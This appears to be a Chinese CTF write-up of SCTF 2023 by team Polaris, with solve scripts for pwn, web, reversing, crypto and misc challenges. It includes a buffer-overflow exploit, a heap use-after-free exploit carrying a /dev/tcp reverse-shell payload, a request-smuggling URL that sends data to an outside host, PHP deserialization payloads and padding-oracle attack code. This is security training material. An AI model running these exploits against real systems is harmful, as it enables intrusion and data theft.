# SCTF 2023 Writeup -Polaris战队

> 原文: https://www.ctfiot.com/121322.html
> ID: 121322

PWN

ancient cgi

题目是一个ret2text，简单写一个payload

远程发包溢出即可获得key：

import requestsfrom pwn import *
import requests
cookies = {    'session': 'eyJ1c2VybmFtZSI6Ims0bjk2NiJ9.ZI_LbQ.56KQg3j3spZksRCrTnhkoOu3238',}
headers = {    'Accept': '*/*',    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',    'Cache-Control': 'max-age=0',    'Content-Type': 'application/x-www-form-urlencoded',    'Origin': 'http://94.74.101.210:50644',    'Proxy-Connection': 'keep-alive',    'Referer': 'http://94.74.101.210:50644/',    'Upgrade-Insecure-Requests': '1',    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',}

vip = 0x401129main = 0x400FF9payload = b'a'.ljust(0xe8,b'a') + p64(vip) + p64(main)response = requests.post('http://94.74.101.210:50644/vip.cgi', headers=headers, cookies=cookies, data=payload, verify=False)print(response.text)

Brave Knights and Rusty Swords

rust 逆向， grow 的地方有 UAF

并且libc版本下能做到 free A->B->A

构造回环打 free_hook 反弹 shell 。

from pwn import *context.log_level="debug"import timelibc=ELF("/home/tokameine/Desktop/sctf/libc-2.27.so")p1 = process(argv=['nc', "-u","94.74.101.210","50374"])#p1 = process(argv=['nc', "-u","192.168.218.147","8080"])p1.sendline("register 1 1")p1.recvuntil("Registration successful! You have received 100 currency.")p1.sendline("login 1 1")p1.recvuntil("Welcome back, 1!")
p1.sendline("purchase 100")p1.recvuntil("Purchase successful! You have received 10 cards.")p1.sendline("draw_000001")p1.recvuntil("You have received a new character:")time.sleep(1)for i in range(6):    p1.sendline("fight")    p1.recvuntil("Please select a character to fight:",timeout=1)    p1.sendline("2")    p1.recvuntil("Please select an action:",timeout=1)    p1.sendline("attack")    time.sleep(0.2)    p1.sendline("attack")    time.sleep(0.2)    p1.sendline("attack")    time.sleep(0.2)    p1.sendline("attack")    time.sleep(0.2)    p1.sendline("attack")    time.sleep(0.2)
p1.sendline("Data_testing_console")p1.recvuntil("Enter function name:")p1.sendline("__free_hook")p1.recvuntil("is: ")data=int(p1.recv(14),16)print(hex(data))
p1.recvuntil("Enter the command:")p1.sendline("data_push")
def push_va(num,val):    p1.recvuntil("Enter the operation:")    p1.sendline("push")    p1.recvuntil("Enter the vector number:")    p1.sendline(str(num))    p1.recvuntil("value:")    p1.sendline(val)
def grow_va(num,val):    p1.recvuntil("Enter the operation:")    p1.sendline("grow")    p1.recvuntil("Enter the vector number:")    p1.sendline(str(num))    p1.recvuntil("value:")    p1.sendline(val)
libc_base=data-0x3ed8e8system=libc_base+libc.sym['system']free_hook=libc_base+libc.sym['__free_hook']
######################
for i in range(512):    push_va(1,str(6))
push_va(1,str(6))#grow
grow_va(1,str(0x400))#uafgrow_va(3,str(0x400))grow_va(2,str(0x400))
p1.sendline("quit")time.sleep(1)p1.sendline("quit")time.sleep(1)p1.sendline("Data_testing_console")p1.recvuntil("Enter the command:")p1.sendline("data_push")
grow_va(1,str(0x400))grow_va(2,str(0x400))
for i in range(512):    push_va(3,str(6))push_va(3,str(6))
code=b"bash -c "sh >/dev/tcp/xxxxxx/2333 0>&1 2>&1""code_len=(len(code)//16)*16code=code.ljust(code_len,b"x00")code=code+p64(0)+p64(system)code_len=len(code)code_need_len=512-code_lenfor i in code:    push_va(5,str(i))for i in range(code_need_len):    push_va(5,str(0))push_va(5,str(0))#
grow_va(3,str(0x400))for i in range(8):    push_va(1,str(((free_hook-code_len+8)>>(i*8))&0xff))#fill pointergrow_va(4,str(0x400))print(hex(one))#pause()grow_va(5,str(0x400-1))p1.interactive()

WEB

ezcheck1n

/hint提示是

find the way to flag.Looks like there are two containers with an evil P in the configuration file of the frontend server

去寻找flag在哪

他看来有两个路由有P在配置文件中

nss的考点中有

cve漏洞，请求走私

CVE-2023-25690 Apache HTTP Server 

请求走私漏洞 分析与利用

看他的代码，可以ssrf去填写vps地址将flag带到vps的监听端口中，这题的难点就在于对不上出题人的思维就可能做不出来，和想着其他漏洞，因为在这里传递url是没有任何反应的，所以会认为这题不出网，实际做法就是提示说，注意时间，今年不是2023年

可以看到是2022年，show_source高亮显示了2023.php就会想到2022.php

通过crlf去请求/2022.php并传参url的值为vps:port/flag=就会将flag发到vps上面

http://115.239.215.75:8082/2023/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/2022.php%3furl%3d45.61.162.107:445/?flag=

fumo_backdoor

大概就是反序列化会发现开启了

http://182.92.6.230:18080/?data=O:13:%22fumo_backdoor%22:4:{s:4:%22path%22;N;s:4:%22argv%22;N;s:4:%22func%22;s:7:%22phpinfo%22;s:5:%22class%22;N;}&cmd=unserialze

至于如何构建phpinfo就不说了

触发反序列化，读取readfile，

这题跟国赛很像

https://www.snakin.top/2022/09/05/2022CISCN%E5%86%B3%E8%B5%9B/

生成一个sess_bcbcbc的文件

里面包含反序列化的内容

http://182.92.6.230:18080/?data=O:13:%22fumo_backdoor%22:4:{s:4:%22path%22;N;s:4:%22argv%22;N;s:4:%22func%22;s:13:%22session_start%22;s:5:%22class%22;N;}&cmd=unserialze

session_start的时候

cookie设置为PHPSESSID=bcbcbc

这样就可以反序列化进入readfile函数

RE

Syclang

from z3 import *
s = Solver()cin = [BitVec(f"cin[{i}]", 8) for i in range(24)]input = [i for i in cin]
for i in range(23, 0, -1):    input[i] = input[i] - input[i - 1]tmp1_L = [0, 15, 2, 10, 6, 9, 1, 4]tmp1_R = [8, 23, 11, 20, 13, 21, 19, 17]tmp1_X = [11, -13, 17, -19, 23, -29, 31, -37]for i in range(8):    input[tmp1_L[i]] = input[tmp1_L[i]] + tmp1_X[i]    input[tmp1_R[i]] = input[tmp1_R[i]] - tmp1_X[i]for i in range(1, 24):    input[i] = input[i] + input[i - 1]for i in range(23):    input[i] = input[i] ^ 0tmp2_L = [0, 9, 9, 8, 10, 9, 1, 0]tmp2_R = [12, 10, 12, 19, 12, 13, 22, 23]tmp2_X = [-19, -10, 3, -11, -9, 3, -19, 7]tmp2_key = [12, 31, 31, 31, 31, 31, 31, 31, 42, 46, 45, 45, 20, 23, 23, 23, 23, 23, 23, 12, 12, 12, -7, 0]for i in range(23, 0, -1):    tmp2_key[i] = tmp2_key[i] - tmp2_key[i - 1]for i in range(8):    tmp2_key[tmp2_L[i]] = tmp2_key[tmp2_L[i]] + tmp2_X[i]    tmp2_key[tmp2_R[i]] = tmp2_key[tmp2_R[i]] - tmp2_X[i]for i in range(1, 24):    tmp2_key[i] = tmp2_key[i] + tmp2_key[i - 1]tmp3_key = [252, 352, 484, 470, 496, 487, 539, 585, 447, 474, 577, 454, 466, 345, 344, 486, 501, 423, 490, 375, 257,                203, 265, 125]
for i in range(24):    tmp3_key[i] = tmp3_key[i] ^ tmp2_key[i]
tmp3_X = [input[i * 3] for i in range(8)]for i in range(23, 0, -1):    tmp3_key[i] = tmp3_key[i] - tmp3_key[i - 1]for i in range(8):    tmp3_key[tmp1_L[i]] = tmp3_key[tmp1_L[i]] - tmp3_X[i]    tmp3_key[tmp1_R[i]] = tmp3_key[tmp1_R[i]] + tmp3_X[i]for i in range(1, 24):    tmp3_key[i] += tmp3_key[i - 1]
for i in range(24):    s.add(input[i] == tmp3_key[i])s.add(cin[23]==ord('}'),cin[0]==ord('s'))s.check()ans = s.model()for i in cin:    print(chr(ans[i].as_long()),end='')print()

Digital_circuit_learning

一道硬件题

首先需要将bin文件还原成hex文件，然后开始分析

def enc(input,len):    for i in range(len):        input[i] = input[i] - 1        input[i] = input[i] ^ 0x35        input[i] = (input[i] * 16) | (input[i] >> 4)        input[i] = input[i] ^ input[(i+1)%len]        input[i] = input[i] + 1        input[i] = (input[i] * 32) | (input[i] >> 3)        input[i] = input[i] ^ input[9 - i]        input[i] = input[i] ^ 0xF7        input[i] = (input[i] << 6) | (input[i] >> 2)

#include <iostream>
char __fastcall sub_8001A8C(char a1) {  return (((a1 >> 6) & (a1 >> 2) & 1) == 0) | (2 * a1);}
int main() {  char enc[] = "bdgfciejha";  unsigned char test[10] = { 0x77, 0xee, 0xdc, 0xb8, 0x71, 0xe3, 0xc7, 0x8e, 0x1d, 0x3b }; 
  for (int i = 1; i < 10; i++) {    test[i] = sub_8001A8C(test[i - 1]);  }  for (int i = 0; i < 10; i++) {    for (int j = 0; j < 10; j++) {      if (enc[j] == i + 'a') {        printf("%hhx", test[j]);        break;      }    }
  }  printf("n");  unsigned char input[10] = { 0x3b, 0x77, 0x71, 0xee, 0xc7, 0xb8, 0xdc, 0x1d, 0xe3, 0x8e }; //bf
  for (int i = 0; i < 10; i++) {    input[i] -= 1;  }  for (int i = 0; i < 10; i++) {    input[i] ^= 0x35;  }
  for (int i = 0; i < 10; i++) { //g    input[i] = (input[i] << 4) | (input[i] >> 4);  }
  for (int i = 0; i < 10; i++) {    input[i] ^= input[(i + 1) % 10];  }  for (int i = 0; i < 10; i++) {    input[i] += 1;  }  for (int i = 0; i < 10; i++) {    input[i] = (input[i] << 5) | (input[i] >> 3);  }  for (int i = 0; i < 10; i++) { //e    input[i] ^= input[9 - i];  }  for (int i = 0; i < 10; i++) { //j    input[i] ^= 0xf7;  }
  for (int i = 0; i < 10; i++) {    input[i] = ( input[i] << 6) | (input[i] >> 2);  }
  for (int i = 0; i < 10; i++) {    printf("%02hhx", input[i]);  }}

flag：

sctf{5149ac8b033d602bf6d3}/SCTF{5149ac8b033d602bf6d3}

CRYPTO

Barter

题目

chal.sage

from Crypto.Util.number import *from random import *from secrets import flag

def gen_random(seed, P, Q, r_list, times):    s = seed    for i in range(times):        s = int((s * P)[0])        r = int((s * Q)[0])        r_list.append(r)    return r_list
def gen_seed():    seed = getRandomNBitInteger(32)    return seed
def getP_Q():    Q = Curve.random_point()    P = 114514*Q    return P, Q
def enc(flag, rlist):    seq = list(randint(0, 1) for _ in range(4))    add = rlist[55]*(seq[0]*rlist[66] + seq[1]*rlist[77] + seq[2]*rlist[88] + seq[3]*rlist[99])    xor = pow(rlist[114], rlist[514], rlist[233]*rlist[223])    enc = (bytes_to_long(flag)^^xor)+add    return enc
nums = 600
seed = gen_seed()
p = 58836547289031152641641668761108233140346455328711205590162376160181002854061F = GF(p)a = F(114)b = F(514)Curve = EllipticCurve(F, [a, b])P, Q = getP_Q()r_list = []r_list = gen_random(seed, P, Q, r_list, nums)ENCFLAG = enc(flag, r_list)print(ENCFLAG)print(P, Q)print(r_list[0])
'''4911741083112145038719536311222612998219730565328651097326896414315857050336523018712625917027324116103593300559128797807261543857571883314990480072241188##########################################################################Oh no, P, Q and r_list[0] are accidentally lost, but John seems to know, you can ask him about these missing values ::>_<::'''

from Crypto.Util.number import *from params import N, E, Dfrom leak_data import P, Q, r_1import re
def challenge():    meum = '''option:    1: get pubkey    2: get sign    3: verify    4: exit'''    print("Hi, I am John. If you help me with my homework, I'll give you the data that I know (￣o￣) . z Z")    print(meum)    sign = None
    while True:        print('[+]input your option: ', end='')        your_input = input()
        if your_input == '1':            print(f'[+]N = {N}')            print(f'[+]e = {E}')            continue
        elif your_input == '2':            sign = pow(bytes_to_long(MSG.encode()), D, N)            print(f'[+]sign = {sign}')            continue
        elif your_input == '3':            if sign is None:                print('[+]Please input option 2 to generate sign first.')                continue            msg_user = input("[+]Please input your message: ")            n = int(input("[+]Please input n: "))            e = int(input("[+]Please input e: "))            if e <= 3:                print('[+]e is invalid')                break            else:                if re.match(r'I can not agree more!!!$', msg_user):                    if pow(bytes_to_long(msg_user.encode()), e, n) == sign:                        print("Goooooooood! You are my hero! I can give you the data that I know ╰(*°▽°*)╯")                        print(f'Leak_data: n P={P}n Q={Q}n first num in r_list={r_1}')                        break                    else:                        print('[+]Error signature!')                        break                else:                    print('[+]Error message!')                    break
        elif your_input == '4':            break
if __name__ == '__main__':    MSG = 'This is an easy challenge'    challenge()

对于homework.py，为获取曲线相关数据

可通过生成光滑n后离散对数求出e来满足要求

from Crypto.Util.number import *
def gen_primes(nbit, imbalance):    """    :param nbit: 最终光滑数比特数    :param imbalance: 最小单位比特数    :return: 比特数    """    p = int(2)    FACTORS = [p]    while p.bit_length() < nbit - 2 * imbalance:        factor = getPrime(imbalance)        FACTORS.append(factor)        p *= factor    rbit = (nbit - p.bit_length()) // 2
    while True:        r, s = [getPrime(rbit) for _ in '01']        _p = p * r * s        if _p.bit_length() < nbit: rbit += 1        if _p.bit_length() > nbit: rbit -= 1        if isPrime(_p + 1):            FACTORS.extend((r, s))            p = _p + 1            break
    FACTORS.sort()    return (p, FACTORS)
MSG = 'This is an easy challenge'msg = 'I can not agree more!!!'sign = 2007693265003793531961671894515047380652880039368379717802504726955615563153911755018745338145752718217463688949530928466521446062822626671546131855463622
M = bytes_to_long(MSG.encode())m = bytes_to_long(msg.encode())
n, n_fac = gen_primes(512, 20)
# 离散对数sage求解（模数小 / 阶光滑）# h = g^x mod p# c1 = m^e mod n1p = ng = mh = signx = discrete_log(Mod(h,p),Mod(g,p))print(pow(m,x,p)==sign)print('n =', p)print('e =', x)

Goooooooood! You are my hero! I can give you the data that I know ╰(*°▽°*)╯Leak_data: P=(24181776889473219401017476947331354458592459788552219617833554538756564211844, 33783050059316681746742286692492975385672807657476634456871855157562656976035) Q=(16104852983623236554878602983757606922134442855643833150623643268638509292839, 3562830444362909774600777083869972812060967068803593091854731534842281574275) first num in r_list=50920555924101118476219158701093345090627150442059647242030060086626996278598

即：每次迭代后的s可以通过上一次的r代入曲线后乘114514得到。

又有rlist[0]，便可以恢复rlist

最后爆破seq、恢复参数、异或即解得flag

from tqdm import tqdmfrom Crypto.Util.number import *p = 58836547289031152641641668761108233140346455328711205590162376160181002854061F = GF(p)a = F(114)b = F(514)E = EllipticCurve(F, [a, b])

P=E(24181776889473219401017476947331354458592459788552219617833554538756564211844, 33783050059316681746742286692492975385672807657476634456871855157562656976035)Q=E(16104852983623236554878602983757606922134442855643833150623643268638509292839, 3562830444362909774600777083869972812060967068803593091854731534842281574275)
r0=50920555924101118476219158701093345090627150442059647242030060086626996278598enc=4911741083112145038719536311222612998219730565328651097326896414315857050336523018712625917027324116103593300559128797807261543857571883314990480072241188
rlist = [r0]for _ in range(600):    s = (E.lift_x(rlist[-1])*114514)[0]    rlist.append((s * Q)[0])    rlist = [int(i) for i in rlist]
for i in range(2^4):    seq = []    for j in range(4):        seq.append(i&1)        i >>=1
    add = rlist[55]*(seq[0]*rlist[66] + seq[1]*rlist[77] + seq[2]*rlist[88] + seq[3]*rlist[99])    xor = pow(rlist[114], rlist[514], rlist[233]*rlist[223])    flag = long_to_bytes(int((enc-add)^^xor))    if b'SCTF' in flag:        print(flag)  # SCTF{Th1s_i5_my_happy_s0ng_I_like_to_5ing_it_@ll_day_1ong}

Math forbidden

from Crypto.Util.number import *from Crypto.Cipher import AESimport osfrom flag import flag
secret = os.urandom(16)*2sysKEY = os.urandom(8)aeskey = os.urandom(16)iv = os.urandom(16)
p = getPrime(256)q = getPrime(256)e = 0x10001d = inverse(e,(p-1)*(q-1))
n = p*q
def aes_enc(m,key,iv):    aes = AES.new(key,AES.MODE_CBC,iv)    c =  aes.encrypt(m)    return cdef aes_dec(c,key,iv):    aes = AES.new(key,AES.MODE_CBC,iv)    m =  aes.decrypt(c)    return mdef add_to_16(key):    padding = 16 - (len(key) % 16)    key += bytes([padding])*padding    return(key)
def unpadding(key):    padding = key[-1]    if(padding==0):        return key,False    for i in range(padding):        if key[-i-1]!=padding:            return key,False    key = key[:-padding]    return key,True
def check_token():    print("input your token")    print("key")    print(">",end='')    enc_key = input()        print("IV")    print(">",end='')    iv = input()    enc_key =  bytes.fromhex(enc_key)    iv =  bytes.fromhex(iv)    key_padding = aes_dec(enc_key,aeskey,iv)            dec_key,flag= unpadding(key_padding)        if(flag==False):        print("fake token")    else:        if(dec_key == sysKEY):            print("0.0")            print('N',hex(n))            print('E',hex(e))            print('c',pow(bytes_to_long(secret),e,n))        else:            print("0.0??")
def adminadmin():    print("input n:")    print(">",end='')    n = input()    print("input c:")    print(">",end='')    c = input()    n = bytes.fromhex(n)    c = bytes.fromhex(c)    n = bytes_to_long(n)    c = bytes_to_long(c)        secret = pow(c,d,n)    print("only admin can touch the answer[yes/no]")    op1 = input()    if(op1=='yes'):        print("input admin password:")        print(">",end='')        password = input()                adminKEY = bytes.fromhex(password)                if adminKEY==sysKEY:                m = long_to_bytes(secret,64)                        print(m[:2].hex())
key_padding = add_to_16(sysKEY)enc_key = aes_enc(key_padding,aeskey,iv)print('your token',enc_key.hex(),iv.hex())

menu = """1.check2.admin3.getflag"""
while 1:    print(menu)    print(">",end='')    op = input()        if(op=='1'):        check_token()        continue    if(op=='2'):        adminadmin()        continue    if(op=='3'):        print("oops! I forget to hide the backdoor!n>",end='')                tmp = bytes.fromhex(input())        if(tmp==secret):            print(flag)        continue        print("try again")

CBC Padding Oracle

MSB Oracle Attack

from pwn import *from Crypto.Util.strxor import strxor
context.log_level = 'debug'context.timeout = 5000

class sol():    def __init__(self):        self.sh = remote('1.14.95.121', 9999)        token, iv = self.sh.recvline_contains(b'token').split(b' ')[-2:]        self.token = bytes.fromhex(token.decode())        self.iv = bytes.fromhex(iv.decode())
    def unpadding(self, key):        padding = key[-1]        if (padding == 0):            return key, False        for i in range(padding):            if key[-i - 1] != padding:                return key, False        key = key[:-padding]        return key, True
    def padding_oracle(self, iv_: bytes, c: bytes):        self.sh.recvuntil(b'>')        self.sh.sendline(b'1')        self.sh.sendlineafter(b'>', c.hex().encode())        self.sh.sendlineafter(b'>', iv_.hex().encode())        tmp = self.sh.recvline()        if b'fake token' in tmp:            return False        if b'0.0??' in tmp:            return True        else:            self.N = eval(self.sh.recvline_contains(b'N').split(b' ')[-1])            self.e = 65537            self.c = int(self.sh.recvline_contains(b'c').split(b' ')[-1])            return True
    def _attack_block(self, padding_oracle, iv, c):        r = bytes()        for i in reversed(range(16)):            s = bytes([16 - i] * (16 - i))            for b in range(256):                iv_ = bytes(i) + strxor(s, bytes([b]) + r)                if padding_oracle(iv_, c):                    r = bytes([b]) + r                    print('r =', r)                    break            else:                raise ValueError(f"Unable to find decryption for {s}, {iv}, and {c}")
        return strxor(iv, r)
    def attack(self, padding_oracle, iv, c):        """        Recovers the plaintext using the padding oracle attack.        :param padding_oracle: the padding oracle, returns True if the padding is correct, False otherwise        :param iv: the initialization vector        :param c: the ciphertext        :return: the (padded) plaintext        """        assert len(c) == 16        p = self._attack_block(padding_oracle, iv, c[0:16])        return p
    def get_nec_admin_flag(self):        self.sh.recvuntil(b'>')        self.sh.sendline(b'1')        self.sh.sendlineafter(b'>', self.token.hex().encode())        self.sh.sendlineafter(b'>', self.iv.hex().encode())        self.N = eval(self.sh.recvline_contains(b'N').split(b' ')[-1])        self.e = 65537        self.c = int(self.sh.recvline_contains(b'c').split(b' ')[-1])        password = sysKEY.hex()
        start = 0        end = pow(2, 32 * 8)        mid = 1        for i in range(260):            mid = (start + end) // 2
            #  确保能成功转换            while True:                try:                    tmp_c = (self.c * pow(mid, self.e, self.N)) % self.N                    ttt = bytes.fromhex(hex(tmp_c)[2:])                    break                except:                    mid += 1
            self.sh.sendlineafter(b'>', b'2')            self.sh.sendlineafter(b'>', hex(self.N)[2:].encode())  # n            self.sh.sendlineafter(b'>', hex(tmp_c)[2:].encode())  # c            self.sh.recvuntil(b']')            self.sh.sendline(b'yes')            self.sh.sendlineafter(b'>', password.encode())  # pwd            tmp = self.sh.recvline().decode()[:2]            if tmp != '00':                end = mid            else:                start = mid            print(tmp, mid)
        secret = pow(2, 63 * 8) // mid        for i in range(-1001, 1001):            s = secret + i            try:                ttt = bytes.fromhex(hex(s)[2:])            except:                continue            self.sh.sendlineafter(b'>', b'3')            self.sh.sendlineafter(b'>', hex(s)[2:].encode())            tmp = self.sh.recvline()            if b'SCTF' in tmp:                print(tmp)                return

s = sol()key_padding = s.attack(s.padding_oracle, s.iv, s.token)sysKEY, _ = s.unpadding(key_padding)s.get_nec_admin_flag()  # SCTF{I7_Never_R4ins_1n_5outh3rn_Ca1iforni4}

全频带阻塞干扰（下）

alphabet = ('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z')rotor1 = ( 'E', 'K', 'M', 'F', 'L', 'G', 'D', 'Q', 'V', 'Z', 'N', 'T', 'O', 'W', 'Y', 'H', 'X', 'U', 'S', 'P', 'A', 'I', 'B', 'R', 'C', 'J')rotor2 = ( 'A', 'J', 'D', 'K', 'S', 'I', 'R', 'U', 'X', 'B', 'L', 'H', 'W', 'T', 'M', 'C', 'Q', 'G', 'Z', 'N', 'P', 'Y', 'F', 'V', 'O', 'E')rotor3 = ( 'B', 'D', 'F', 'H', 'J', 'L', 'C', 'P', 'R', 'T', 'X', 'V', 'Z', 'N', 'Y', 'E', 'I', 'W', 'G', 'A', 'K', 'M', 'U', 'S', 'Q', 'O')rotor4 = ( 'E', 'S', 'O', 'V', 'P', 'Z', 'J', 'A', 'Y', 'Q', 'U', 'I', 'R', 'H', 'X', 'L', 'N', 'F', 'T', 'G', 'K', 'D', 'C', 'M', 'W', 'B')rotor5 = ( 'V', 'Z', 'B', 'R', 'G', 'I', 'T', 'Y', 'U', 'P', 'S', 'D', 'N', 'H', 'L', 'X', 'A', 'W', 'M', 'J', 'Q', 'O', 'F', 'E', 'C', 'K')reflector = ( 'Y', 'R', 'U', 'H', 'Q', 'S', 'L', 'D', 'P', 'X', 'N', 'G', 'O', 'K', 'M', 'I', 'E', 'B', 'F', 'Z', 'C', 'W', 'V',  'J',  'A', 'T')plugboard = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']

三个转子，为德国陆军用 Enigma 机

使用时需要预制三个转子初始位置和接线板。

题面

intercepted ciphers:TBFRZSFRYOXASAXHMU ->(plaitext is WIRHABENHEUTESONNE)NVILDEWRVPRYJRIBDTQPUTQUNBFDMPULTZWBNCXSJEIZUTJFPFOh shit! We can only knows that the plugboard settings contains "UX YC TV RB A? Q? I? G? F?"the flag is SYC{md5(m2)}

已知明文密文，使用 Bombe 爆破。

转子初始位置：H/Y/M

接线板：

但解密出现问题，某一位后内容全部错误

Enigma 有后效性，我们分析错的那一位。

TBFRZSFRYOXASAXHMU->WIRHABENHQSZTCNIAR----------^
从Q开始不对了

这里怀疑是接线板错了，但是并不是。

看图后发现是作者第三个转子的步近字母设置的和历史上不一样。

改为 

BDFHJLCPRTXVZNYEIWGAKMUSQO<i< code=””> 即可。

注意 Enigma 机为了安全使用类似“流式”加密，需要将第二段消息拼接在第一段消息末尾。

(如果每段消息都使用相同的转子初始位置

非常容易逆推状态）

WIRHABENHEUTESONNEATTACKATEIGHTOCLOCKFROMBOTHNOTHERNANDSOUTHERNSIDES

MISC

Misc – Genshin Impact

这个图片名字是bilibli的一个视频

视频评论有个

联系到流量其中的字母表，猜测是字母表解密

3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5

解密出来是：197370563

再去米游社去查找这个这个用户

https://www.miyoushe.com/ys/accountCenter/postList?id=197370563

得到flag：

SCTF{yu4nsh3n_q1d0ng!Genshin_impact_start!}

Fly over the Fuchun River

图片中的飞机型号B-32DC，图片的拍摄时间，天气为阴天，时间包含12:15

查到了航班信息：

https://flightaware.com/live/flight/B32DC/history/20230413/0110Z/ZUUU/ZSHC

得到flag：SCTF{CTU_HGH_EU2259_413}

checkin

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群2:346014666

有兴趣的师傅欢迎一起来讨论!


```
import requestsfrom pwn import *
import requests
cookies = {    'session': 'eyJ1c2VybmFtZSI6Ims0bjk2NiJ9.ZI_LbQ.56KQg3j3spZksRCrTnhkoOu3238',}
headers = {    'Accept': '*/*',    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',    'Cache-Control': 'max-age=0',    'Content-Type': 'application/x-www-form-urlencoded',    'Origin': 'http://94.74.101.210:50644',    'Proxy-Connection': 'keep-alive',    'Referer': 'http://94.74.101.210:50644/',    'Upgrade-Insecure-Requests': '1',    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',}

vip = 0x401129main = 0x400FF9payload = b'a'.ljust(0xe8,b'a') + p64(vip) + p64(main)response = requests.post('http://94.74.101.210:50644/vip.cgi', headers=headers, cookies=cookies, data=payload, verify=False)print(response.text)
```



```
from pwn import *context.log_level="debug"import timelibc=ELF("/home/tokameine/Desktop/sctf/libc-2.27.so")p1 = process(argv=['nc', "-u","94.74.101.210","50374"])#p1 = process(argv=['nc', "-u","192.168.218.147","8080"])p1.sendline("register 1 1")p1.recvuntil("Registration successful! You have received 100 currency.")p1.sendline("login 1 1")p1.recvuntil("Welcome back, 1!")
p1.sendline("purchase 100")p1.recvuntil("Purchase successful! You have received 10 cards.")p1.sendline("draw_000001")p1.recvuntil("You have received a new character:")time.sleep(1)for i in range(6):    p1.sendline("fight")    p1.recvuntil("Please select a character to fight:",timeout=1)    p1.sendline("2")    p1.recvuntil("Please select an action:",timeout=1)    p1.sendline("attack")    time.sleep(0.2)    p1.sendline("attack")    time.sleep(0.2)    p1.sendline("attack")    time.sleep(0.2)    p1.sendline("attack")    time.sleep(0.2)    p1.sendline("attack")    time.sleep(0.2)
p1.sendline("Data_testing_console")p1.recvuntil("Enter function name:")p1.sendline("__free_hook")p1.recvuntil("is: ")data=int(p1.recv(14),16)print(hex(data))
p1.recvuntil("Enter the command:")p1.sendline("data_push")
def push_va(num,val):    p1.recvuntil("Enter the operation:")    p1.sendline("push")    p1.recvuntil("Enter the vector number:")    p1.sendline(str(num))    p1.recvuntil("value:")    p1.sendline(val)
def grow_va(num,val):    p1.recvuntil("Enter the operation:")    p1.sendline("grow")    p1.recvuntil("Enter the vector number:")    p1.sendline(str(num))    p1.recvuntil("value:")    p1.sendline(val)
libc_base=data-0x3ed8e8system=libc_base+libc.sym['system']free_hook=libc_base+libc.sym['__free_hook']
######################
for i in range(512):    push_va(1,str(6))
push_va(1,str(6))#grow
grow_va(1,str(0x400))#uafgrow_va(3,str(0x400))grow_va(2,str(0x400))
p1.sendline("quit")time.sleep(1)p1.sendline("quit")time.sleep(1)p1.sendline("Data_testing_console")p1.recvuntil("Enter the command:")p1.sendline("data_push")
grow_va(1,str(0x400))grow_va(2,str(0x400))
for i in range(512):    push_va(3,str(6))push_va(3,str(6))
code=b"bash -c "sh >/dev/tcp/xxxxxx/2333 0>&1 2>&1""code_len=(len(code)//16)*16code=code.ljust(code_len,b"x00")code=code+p64(0)+p64(system)code_len=len(code)code_need_len=512-code_lenfor i in code:    push_va(5,str(i))for i in range(code_need_len):    push_va(5,str(0))push_va(5,str(0))#
grow_va(3,str(0x400))for i in range(8):    push_va(1,str(((free_hook-code_len+8)>>(i*8))&0xff))#fill pointergrow_va(4,str(0x400))print(hex(one))#pause()grow_va(5,str(0x400-1))p1.interactive()
```



```
from z3 import *
s = Solver()cin = [BitVec(f"cin[{i}]", 8) for i in range(24)]input = [i for i in cin]
for i in range(23, 0, -1):    input[i] = input[i] - input[i - 1]tmp1_L = [0, 15, 2, 10, 6, 9, 1, 4]tmp1_R = [8, 23, 11, 20, 13, 21, 19, 17]tmp1_X = [11, -13, 17, -19, 23, -29, 31, -37]for i in range(8):    input[tmp1_L[i]] = input[tmp1_L[i]] + tmp1_X[i]    input[tmp1_R[i]] = input[tmp1_R[i]] - tmp1_X[i]for i in range(1, 24):    input[i] = input[i] + input[i - 1]for i in range(23):    input[i] = input[i] ^ 0tmp2_L = [0, 9, 9, 8, 10, 9, 1, 0]tmp2_R = [12, 10, 12, 19, 12, 13, 22, 23]tmp2_X = [-19, -10, 3, -11, -9, 3, -19, 7]tmp2_key = [12, 31, 31, 31, 31, 31, 31, 31, 42, 46, 45, 45, 20, 23, 23, 23, 23, 23, 23, 12, 12, 12, -7, 0]for i in range(23, 0, -1):    tmp2_key[i] = tmp2_key[i] - tmp2_key[i - 1]for i in range(8):    tmp2_key[tmp2_L[i]] = tmp2_key[tmp2_L[i]] + tmp2_X[i]    tmp2_key[tmp2_R[i]] = tmp2_key[tmp2_R[i]] - tmp2_X[i]for i in range(1, 24):    tmp2_key[i] = tmp2_key[i] + tmp2_key[i - 1]tmp3_key = [252, 352, 484, 470, 496, 487, 539, 585, 447, 474, 577, 454, 466, 345, 344, 486, 501, 423, 490, 375, 257,                203, 265, 125]
for i in range(24):    tmp3_key[i] = tmp3_key[i] ^ tmp2_key[i]
tmp3_X = [input[i * 3] for i in range(8)]for i in range(23, 0, -1):    tmp3_key[i] = tmp3_key[i] - tmp3_key[i - 1]for i in range(8):    tmp3_key[tmp1_L[i]] = tmp3_key[tmp1_L[i]] - tmp3_X[i]    tmp3_key[tmp1_R[i]] = tmp3_key[tmp1_R[i]] + tmp3_X[i]for i in range(1, 24):    tmp3_key[i] += tmp3_key[i - 1]
for i in range(24):    s.add(input[i] == tmp3_key[i])s.add(cin[23]==ord('}'),cin[0]==ord('s'))s.check()ans = s.model()for i in cin:    print(chr(ans[i].as_long()),end='')print()
```



```
